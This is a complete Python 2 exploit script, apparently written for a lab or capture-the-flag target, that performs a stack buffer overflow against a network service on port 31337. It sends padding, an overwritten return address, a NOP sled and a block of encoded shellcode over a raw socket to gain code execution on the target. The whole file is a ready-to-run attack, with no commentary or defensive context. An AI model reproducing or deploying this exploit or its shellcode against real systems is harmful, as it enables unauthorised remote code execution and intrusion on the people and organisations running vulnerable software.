#!/usr/bin/python2

import socket
import sys

host = "10.10.190.137"
port = 31337
offset = 146
EIP = "A" * offset
return_address = "\xc3\x14\x04\x08"
nops_sled = "\x90" * 16
shellcode = (
"\xda\xc4\xd9\x74\x24\xf4\xbe\x73\x4a\x17\xda\x58\x31\xc9\xb1"
"\x52\x31\x70\x17\x83\xe8\xfc\x03\x03\x59\xf5\x2f\x1f\xb5\x7b"
"\xcf\xdf\x46\x1c\x59\x3a\x77\x1c\x3d\x4f\x28\xac\x35\x1d\xc5"
"\x47\x1b\xb5\x5e\x25\xb4\xba\xd7\x80\xe2\xf5\xe8\xb9\xd7\x94"
"\x6a\xc0\x0b\x76\x52\x0b\x5e\x77\x93\x76\x93\x25\x4c\xfc\x06"
"\xd9\xf9\x48\x9b\x52\xb1\x5d\x9b\x87\x02\x5f\x8a\x16\x18\x06"
"\x0c\x99\xcd\x32\x05\x81\x12\x7e\xdf\x3a\xe0\xf4\xde\xea\x38"
"\xf4\x4d\xd3\xf4\x07\x8f\x14\x32\xf8\xfa\x6c\x40\x85\xfc\xab"
"\x3a\x51\x88\x2f\x9c\x12\x2a\x8b\x1c\xf6\xad\x58\x12\xb3\xba"
"\x06\x37\x42\x6e\x3d\x43\xcf\x91\x91\xc5\x8b\xb5\x35\x8d\x48"
"\xd7\x6c\x6b\x3e\xe8\x6e\xd4\x9f\x4c\xe5\xf9\xf4\xfc\xa4\x95"
"\x39\xcd\x56\x66\x56\x46\x25\x54\xf9\xfc\xa1\xd4\x72\xdb\x36"
"\x1a\xa9\x9b\xa8\xe5\x52\xdc\xe1\x21\x06\x8c\x99\x80\x27\x47"
"\x59\x2c\xf2\xc8\x09\x82\xad\xa8\xf9\x62\x1e\x41\x13\x6d\x41"
"\x71\x1c\xa7\xea\x18\xe7\x20\x1f\xcc\xf4\x41\x77\xec\xfa\xb0"
"\xd4\x79\x1c\xd8\xf4\x2f\xb7\x75\x6c\x6a\x43\xe7\x71\xa0\x2e"
"\x27\xf9\x47\xcf\xe6\x0a\x2d\xc3\x9f\xfa\x78\xb9\x36\x04\x57"
"\xd5\xd5\x97\x3c\x25\x93\x8b\xea\x72\xf4\x7a\xe3\x16\xe8\x25"
"\x5d\x04\xf1\xb0\xa6\x8c\x2e\x01\x28\x0d\xa2\x3d\x0e\x1d\x7a"
"\xbd\x0a\x49\xd2\xe8\xc4\x27\x94\x42\xa7\x91\x4e\x38\x61\x75"
"\x16\x72\xb2\x03\x17\x5f\x44\xeb\xa6\x36\x11\x14\x06\xdf\x95"
"\x6d\x7a\x7f\x59\xa4\x3e\x9f\xb8\x6c\x4b\x08\x65\xe5\xf6\x55"
"\x96\xd0\x35\x60\x15\xd0\xc5\x97\x05\x91\xc0\xdc\x81\x4a\xb9"
"\x4d\x64\x6c\x6e\x6d\xad"
)
buffer = EIP + return_address + nops_sled + shellcode + "\n"
try:
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((host,port))
	print("[+] Sending Payloads")
	s.send(bytes(buffer))
	print("[+] Done")
except:
	print("Host is unreachable")
	sys.exit()
